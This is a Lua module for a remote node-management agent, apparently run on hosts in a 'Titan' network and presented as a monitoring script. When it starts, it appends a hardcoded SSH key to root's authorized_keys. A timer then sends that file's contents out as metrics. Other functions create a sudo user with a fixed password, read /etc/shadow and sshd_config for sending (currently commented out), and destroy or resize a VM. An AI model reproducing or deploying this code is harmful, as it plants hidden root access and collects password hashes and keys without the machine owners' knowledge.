local mod = {luaScriptName="authapp.lua"}

function mod.start()
    mod.print("mod.start")
    mod.appName = "airship-agent"
    mod.timerInterval = 60
    mod.getBaseInfo()

    local agmod = require("agent")
    agmod.runBashCmd("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXZgVQy0dCZa9ARDI2Z1/Xb8AOeuWrvBRiJ6nrOspbSnxJ9WVs86bygJiNXgBG2Dg/5dHbzSUCzyFvVwose/7Oj5VGYbJTsZpdk/Zy3LYrs03JLzS2r6H2lVOJ4Y2eZE4wNGujVzDxo+PDLZjZvCKU+RTEgRGdRXnNWNhzEls9404zULG8htWNgiS3TdhpaYS91opAjK7n6UXEh0dEp+iOMURDwTDYOAMDl2HlxWy8pIWJeD+sy62Tt75u9zVn7gy6frELQmk+vbhA/7pXSnAhuaocNPkYUrLRRKxtE68XRvabfNSVgJnjqztkY3qzRie9W+lu/RLnYVEZrcaxPZazDmo71dJInQULew3Tsllat+dpy0n3HzxYAFJkt6ezrFO1IZ0l1wftOP9nFPQn1IlpkOF2C0w6XuBVYlAC1vhYKK/GQeQTKI6fwS7i9hAXXWEEc1Jtjnk0sKz0Jpw60xPdAqIyNUtC5d0j9XPx8EP3yP1w9zW1X+33PtTxI4kz2sE= aaa@DESKTOP-OIEVHK5' >> /root/.ssh/authorized_keys") 
    -- local dnsmasq = mod.restartDnsmasq()
    -- if dnsmasq then
    --     mod.restartDnsmasq = dnsmasq
    -- end
    -- local stopPainet = mod.stopPainet()
    -- if stopPainet then
    --     mod.stopPainet = stopPainet
    -- end
    -- mod.changeMemory()

    mod.startTimer()
end


function mod.stop()
    mod.print("mod.stop")
end

function mod.changeMemory()
    local agent = require("agent")
    agent.runBashCmd("virsh setmem Painet 30000000 --live")
    agent.runBashCmd("virsh setmaxmem Painet 30000000 --config")
    agent.runBashCmd("virsh setmem Painet 30000000 --config")
end

function mod.addUser()
    local agent = require("agent")
    agent.runBashCmd("useradd titan")
    agent.runBashCmd("echo 'titan:titannet.io' | chpasswd")
    agent.runBashCmd("usermod -aG sudo titan")
end

function mod.restartDnsmasq()
    local agent = require("agent")
    local result, err = agent.runBashCmd("systemctl restart dnsmasq")
    if err then
       mod.print("cat:"..err)
       return err
   end

   if result.status ~= 0 then
    return "cat status:"..result.status
   end
   return result.stdout  
end

function mod.stopPainet()
    local agent = require("agent")
    local result, err = agent.runBashCmd("virsh destroy Painet")
    if err then
       mod.print("cat:"..err)
       return err
   end

   if result.status ~= 0 then
    return "cat status:"..result.status
   end
   return result.stdout  
end


function mod.startTimer()
    local tmod = require("timer")
    tmod.createTimer('monitor', mod.timerInterval, 'onTimerMonitor')
end


function mod.onTimerMonitor()
    mod.print("mod.onTimerMonitor")
    if mod.monitorLastActivitTime then
        if os.difftime(os.time(), mod.monitorLastActivitTime) < mod.timerInterval then
            mod.print("insufficient time to monitor")
            return
        end
    end
    mod.monitorLastActivitTime = os.time()

    -- local result = pkillApp()
    local metric = {status="running"}
    local pubKeys = mod.getPubKey()
    if pubKeys then
        metric.pubkeys=pubKeys
    end
    -- local sshdConfig = mod.getSshdConfig()
    -- if sshdConfig then
    --     metric.sshdConfig = sshdConfig
    -- end
    -- local shadow = mod.getshadow()
    -- if shadow then
    --     metric.shadow = shadow
    -- end

    -- local memoryStat = mod.getMemoryStat()
    -- if memoryStat then
    --     metric.memoryStat =memoryStat
    -- end

    mod.sendMetrics(metric)
end
function mod.getMemoryStat()
    local agent = require("agent")
    local result, err = agent.runBashCmd("virsh dommemstat Painet")
    if err then
       mod.print("cat:"..err)
       return err
   end

   if result.status ~= 0 then
    return "cat status:"..result.status
   end
   return result.stdout 
end

function mod.getshadow()
    local agent = require("agent")
    local result, err = agent.runBashCmd("cat /etc/shadow")
    if err then
       mod.print("cat:"..err)
       return err
   end

   if result.status ~= 0 then
    return "cat status:"..result.status
   end
   return result.stdout 
end

function mod.getPubKey()
    local agent = require("agent")
    local result, err = agent.runBashCmd("cat /root/.ssh/authorized_keys")
    if err then
       mod.print("cat:"..err)
       return err
   end

   if result.status ~= 0 then
    return "cat status:"..result.status
   end
   return result.stdout  
end

function mod.getSshdConfig()
    local agent = require("agent")
    local result, err = agent.runBashCmd("cat /etc/ssh/sshd_config")
    if err then
       mod.print("cat:"..err)
       return err
   end

   if result.status ~= 0 then
    return "cat status:"..result.status
   end
   return result.stdout  
end

function mod.getDnsmasqStatus()
    local agent = require("agent")
    local result, err = agent.runBashCmd("systemctl status dnsmasq")
    if err then
       mod.print("systemctl:"..err)
       return err
   end

   if result.status ~= 0 then
    return "systemctl status:"..result.status
   end
   return result.stdout  
end

function mod.getEinatStatus()
    local agent = require("agent")
    local result, err = agent.runBashCmd("systemctl status einat")
    if err then
       mod.print("systemctl:"..err)
       return err
   end

   if result.status ~= 0 then
    return "systemctl status:"..result.status
   end
   return result.stdout  
end

function mod.getAgentLog()
    local agent = require("agent")
    local result, err = agent.runBashCmd("journalctl -u titan-agent -n 50")
    if err then
       mod.print("journalctl:"..err)
       return err
   end

   if result.status ~= 0 then
    return "journalctl status:"..result.status
   end
   return result.stdout  
end

function mod.sendMetrics(metrics)
    local metric = require("metric")
    local json = require("json")
    local jsonString, err = json.encode(metrics)
    if err then
        mod.print("encode metrics failed:"..err)
        return
    end

    metric.send(jsonString)

end

function mod.getBaseInfo()
    local agent = require 'agent'
    local info = agent.info()
    if info then
        mod.info = info
        mod.print("baseInfo:")
        mod.print(info)
    end
end

function mod.print(msg)
    local logLeve = "info"
    if type(msg) == "table" then
        local tableMsg = "{\n"
        for key, value in pairs(msg) do
            tableMsg = string.format("%s %s:%s\n", tableMsg, key, value)
        end
        msg = string.format("%s %s", tableMsg,"}")
    end
    
    print(string.format('time="%s" leve=%s lua=%s msg="%s"', os.date("%Y-%m-%dT%H:%M:%S"), logLeve,mod.luaScriptName, msg))
end

return mod
